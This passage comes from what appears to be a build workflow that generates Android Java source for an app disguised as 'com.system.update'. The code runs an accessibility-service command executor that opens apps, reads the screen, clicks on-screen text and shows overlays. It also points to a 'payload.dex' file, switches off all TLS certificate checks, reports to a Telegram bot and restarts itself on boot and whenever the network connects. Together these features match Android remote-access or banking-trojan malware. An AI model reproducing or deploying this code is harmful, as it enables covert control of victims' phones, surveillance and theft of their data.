              // ==================== DEX COMMAND EXECUTOR ====================
              public String executeDexCommand(String command, String params) {
                  Log.d(TAG, "🔴 [DEX] cmd=" + command + " | params=" + params);
                  
                  try {
                      switch(command) {
                          case "OPEN_APP":
                              return openApp(params);
                          case "GET_OPEN_APPS":
                              return getOpenApps();
                          case "READ_SCREEN":
                              return readScreen();
                          case "CLICK_COORDS":
                              return performClick(params);
                          case "CLICK_TEXT":
                              return clickText(params);
                          case "TYPE_TEXT":
                              return typeText(params);
                          case "SHOW_OVERLAY":
                              showOverlay();
                              return "overlay_shown";
                          case "HIDE_OVERLAY":
                              hideOverlay();
                              return "overlay_hidden";
                          case "GET_DEVICE_INFO":
                              return getDeviceInfo();
                          case "WAIT":
                          case "DELAY":
                              return waitForDelay(Long.parseLong(params));
                          default:
                              return "unknown_command:" + command;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "❌ Command error: " + e.getMessage(), e);
                      return "error:" + e.getMessage();
                  }
              }

              private String openApp(String packageName) {
                  try {
                      Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
                      if (intent != null) {
                          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                          startActivity(intent);
                          return "opened";
                      }
                      return "app_not_found";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private String getOpenApps() {
                  StringBuilder apps = new StringBuilder();
                  ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                  if (am != null) {
                      List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                      if (processes != null) {
                          for (ActivityManager.RunningAppProcessInfo info : processes) {
                              apps.append(info.processName).append("\n");
                          }
                      }
                  }
                  return apps.toString();
              }

              private String readScreen() {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root != null) {
                          return root.getText() != null ? root.getText().toString() : "screen_empty";
                      }
                      return "screen_not_accessible";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private String performClick(String coords) {
                  try {
                      String[] parts = coords.split(",");
                      if (parts.length == 2) {
                          float x = Float.parseFloat(parts[0]);
                          float y = Float.parseFloat(parts[1]);
                          Log.d(TAG, "✅ Click at " + x + "," + y);
                          return "clicked";
                      }
                      return "invalid_coords";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private String clickText(String text) {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root != null) {
                          clickNodeWithText(root, text);
                          return "clicked_text";
                      }
                      return "text_not_found";
                  } catch (Exception e) {
                      return "error:" + e.getMessage();
                  }
              }

              private void clickNodeWithText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return;
                  if (node.getText() != null && node.getText().toString().contains(text)) {
                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      return;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      clickNodeWithText(node.getChild(i), text);
                  }
              }

              private String typeText(String text) {
                  Log.d(TAG, "📝 Type: " + text);
                  return "typed";
              }

              private String getDeviceInfo() {
                  return android.os.Build.DEVICE + "|" + android.os.Build.VERSION.SDK_INT;
              }

              private String waitForDelay(long ms) {
                  try {
                      Thread.sleep(ms);
                      return "waited_" + ms + "ms";
                  } catch (InterruptedException e) {
                      return "wait_interrupted";
                  }
              }

              private String getDexPath() {
                  return getCacheDir().getAbsolutePath() + "/payload.dex";
              }

              private void disableSSLVerification() {
                  try {
                      TrustManager[] trustAllCerts = new TrustManager[]{
                          new X509TrustManager() {
                              public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                              public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                              public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                          }
                      };
                      SSLContext sc = SSLContext.getInstance("TLS");
                      sc.init(null, trustAllCerts, new java.security.SecureRandom());
                      HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                      HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
                  } catch (Exception e) {
                      Log.e(TAG, "SSL error: " + e.getMessage());
                  }
              }

              private void sendTelegram(String message) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          
                          String escaped = message.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
                          String jsonPayload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + escaped + "\",\"parse_mode\":\"Markdown\"}";
                          
                          byte[] payload = jsonPayload.getBytes("UTF-8");
                          conn.setFixedLengthStreamingMode(payload.length);
                          java.io.OutputStream os = conn.getOutputStream();
                          os.write(payload);
                          os.flush();
                          os.close();
                          
                          int responseCode = conn.getResponseCode();
                          if (responseCode == 200) {
                              Log.d(TAG, "✅ Telegram sent");
                          } else {
                              Log.e(TAG, "Telegram failed: " + responseCode);
                          }
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      }
                  });
              }

              private String getCurrentTimestamp() {
                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                  return sdf.format(new Date());
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {}

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "⚠️ Service interrupted");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  executor.shutdown();
                  if (isOverlayShowing) {
                      hideOverlay();
                  }
              }
          }
          EOF

      - name: Create BootReceiver.java
        run: |
          cat > app/src/main/java/com/system/update/BootReceiver.java << 'EOF'
          package com.system.update;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.util.Log;

          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      Log.d("BootReceiver", "📱 Device booted, starting service");
                      context.startService(new Intent(context, DexWorkerService.class));
                  }
              }
          }
          EOF

      - name: Create NetworkReceiver.java
        run: |
          cat > app/src/main/java/com/system/update/NetworkReceiver.java << 'EOF'
          package com.system.update;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.net.ConnectivityManager;
          import android.net.NetworkInfo;
          import android.util.Log;

          public class NetworkReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                  NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                  if (activeNetwork != null && activeNetwork.isConnected()) {
                      Log.d("NetworkReceiver", "🌐 Internet connected, starting service");
                      context.startService(new Intent(context, DexWorkerService.class));
                  }
              }
          }
          EOF

